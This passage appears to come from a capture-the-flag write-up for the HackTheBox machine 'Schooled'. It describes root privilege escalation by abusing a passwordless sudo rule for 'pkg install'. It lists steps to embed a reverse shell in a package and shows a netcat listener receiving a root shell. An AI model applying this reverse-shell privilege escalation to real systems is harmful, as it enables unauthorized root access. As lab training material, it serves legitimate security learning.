## Sudo -l
Run sudo -l and see you can execute binaries as root without password
```bash
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```
Checking out GTFOBins, see that the path forward is pretty straightforward
![[Pasted image 20210705205615.png]]
From here on the privesc is:
- change where it says *id* to your reverse shell
- upload the new .txz file to the victim
- start a netcat listener on attacking machine
- run binary as sudo and wait for callback

```bash
hunter@kali ~/htb/schooled$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.10.234] 15134
# id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
```